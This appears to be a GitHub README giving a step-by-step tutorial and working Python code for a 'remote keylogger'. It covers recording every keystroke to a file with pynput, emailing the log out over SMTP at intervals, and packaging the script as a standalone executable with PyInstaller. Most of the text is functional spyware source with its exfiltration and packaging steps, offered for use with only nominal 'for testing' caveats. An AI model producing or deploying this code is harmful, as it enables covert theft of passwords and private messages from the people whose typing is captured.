# Python-Remote-Keylogger-
Creating a python keylogger to record keystrokes remotely. 

Objective:

Build a Python-based keylogger to:
	1.	Record keystrokes locally.
	2.	Save them to a log file.
	3.	Optionally email the logs to yourself for testing purposes.

Prerequisites:
	1.	Programming Knowledge: Basic understanding of Python.
	2.	Environment: Python installed on your system.
	3.	Libraries: Install the necessary Python libraries:
	•	pynput (to capture keystrokes).
	•	smtplib (for sending emails, optional).

Install dependencies:

pip install pynput

Step 1: Capture Keystrokes
	1.	Import the pynput library:

from pynput.keyboard import Key, Listener


	2.	Define a function to log keystrokes:

def on_press(key):
    try:
        with open("key_log.txt", "a") as log_file:
            log_file.write(f"{key.char}")
    except AttributeError:
        with open("key_log.txt", "a") as log_file:
            log_file.write(f" {str(key)} ")


	3.	Define a function to handle special keys:

def on_release(key):
    if key == Key.esc:  # Stop logging when Esc is pressed
        return False


	4.	Set up the key listener:

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

Step 2: Save Logs to a File

The captured keystrokes will be saved to a file named key_log.txt in the same directory as the script.

Step 3: Send Logs via Email (Optional)

If you’d like to email the logs (for testing purposes only), follow these steps:
	1.	Import the smtplib library:

import smtplib
from email.mime.text import MIMEText


	2.	Define a function to send the email:

def send_email():
    sender_email = "your_email@example.com"
    receiver_email = "your_email@example.com"
    password = "your_email_password"
    
    with open("key_log.txt", "r") as log_file:
        log_content = log_file.read()
    
    message = MIMEText(log_content)
    message["Subject"] = "Keylogger Logs"
    message["From"] = sender_email
    message["To"] = receiver_email
    
    with smtplib.SMTP("smtp.example.com", 587) as server:
        server.starttls()
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message.as_string())


	3.	Call send_email() at regular intervals (e.g., after logging a certain number of keystrokes).

Step 4: Add Error Handling

Enhance the script to handle errors, such as permissions issues or missing libraries.

Step 5: Package the Keylogger
	1.	Convert the script to an executable for testing purposes using PyInstaller:

pip install pyinstaller
pyinstaller --onefile keylogger.py


	2.	The executable will be created in the dist folder.

Step 6: Test in a Virtual Environment
	•	Run the keylogger in a controlled environment (e.g., a virtual machine) to observe its functionality.